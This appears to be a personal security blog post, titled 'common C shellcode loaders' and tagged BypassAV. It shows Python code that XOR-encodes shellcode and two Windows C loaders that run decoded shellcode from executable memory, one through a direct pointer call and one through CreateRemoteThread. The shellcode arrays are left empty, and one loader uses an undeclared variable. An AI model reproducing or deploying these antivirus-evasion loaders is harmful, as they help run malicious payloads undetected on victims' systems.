@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>C语言常见Shellcode加载器 | Zer0-hex&#39;s Blog</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://Zer0-hex.github.io/favicon.ico?v=1666449900454">
+<link rel="stylesheet" href="https://Zer0-hex.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="Python简单实现对Shellcode的XOR加密
+shellcode = &quot;&quot;      # \xfc\x48\x83\xe4......
+for i, n in enumerate(shellcode):
+    ..." />
+    <meta name="keywords" content="BypassAV" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://Zer0-hex.github.io">
+        <img src="https://Zer0-hex.github.io/images/avatar.png?v=1666449900454" class="site-logo">
+        <h1 class="site-title">Zer0-hex&#39;s Blog</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      What are fucking doing?
+    </div>
+    <div class="site-footer">
+      Hack for <a href="https://github.com/Zer0-hex" target="_blank">Zer0-hex</a> | <a class="rss" href="https://Zer0-hex.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">C语言常见Shellcode加载器</h2>
+            <div class="post-date">2022-09-11</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="python简单实现对shellcode的xor加密">Python简单实现对Shellcode的XOR加密</h2>
+<pre><code class="language-Python">shellcode = &quot;&quot;      # \xfc\x48\x83\xe4......
+for i, n in enumerate(shellcode):
+    temp = ord(n) ^ (i % 73)
+    print('0x%.2x, ' % temp, end='')
+    if i % 16 == 15:
+        print()
+</code></pre>
+<h2 id="c语言加载">C语言加载</h2>
+<ul>
+<li>指针调用</li>
+</ul>
+<pre><code class="language-C">#include&lt;stdio.h&gt;
+#include&lt;windows.h&gt;
+
+unsigned char shellcode[1024] = {
+    // 0xfc, 0x49, 0x81, 0xe7, 0xf4, 0xed......
+};
+
+void init() {
+    for (int i=0; i &lt; sizeof(shellcode); i++) {
+       shellcode[i] ^= (i % 73);
+    }
+}
+
+void print_shellcode() {
+    for(int i=0; i &lt; sizeof(shellcode); i++) {
+        printf(&quot;0x%.2x, &quot;, shellcode[i]);
+        if (i % 16 == 15) {
+            printf(&quot;\n&quot;);
+        }
+    }
+}
+
+int main(void) {
+    init();
+    print_shellcode();
+    exec = VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof(shellcode));
+    printf(&quot;[+] exec start...\n&quot;);
+    (*(void(*)())exec)();
+    printf(&quot;[-] exec end...\n&quot;);
+    return 0;
+}
+</code></pre>
+<ul>
+<li>Remote thread Loader</li>
+</ul>
+<pre><code class="language-C">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+unsigned char shellcode[1024] = {
+    //0xfc, 0x49, 0x81, 0xe7, 0xf4......
+};
+
+void init() {
+    for (int i=0; i &lt; sizeof(shellcode); i++) {
+       shellcode[i] ^= (i % 73);
+    }
+}
+
+void print_shellcode() {
+    for(int i=0; i &lt; sizeof(shellcode); i++) {
+        printf(&quot;0x%.2x, &quot;, shellcode[i]);
+        if (i % 16 == 15) {
+            printf(&quot;\n&quot;);
+        }
+    }
+}
+
+int main(void) {
+    init();
+    print_shellcode();
+	HANDLE hProc = (HANDLE)-1;
+	PVOID pAddress = VirtualAllocEx(hProc, NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(hProc, pAddress, shellcode, sizeof(shellcode), NULL);
+	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pAddress, NULL, NULL, NULL);
+    printf(&quot;[+] Wait thread...\n&quot;);
+	WaitForSingleObject(hThread, INFINITE);
+    printf(&quot;[-] Thread exit...\n&quot;);
+	return 0;
+}
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://Zer0-hex.github.io/tag/3gf60PEJ4/" class="tag">
+                    BypassAV
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://Zer0-hex.github.io/post/arch-linux-an-zhuang/">
+                  <h3 class="post-title">
+                    Arch Linux 安装
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
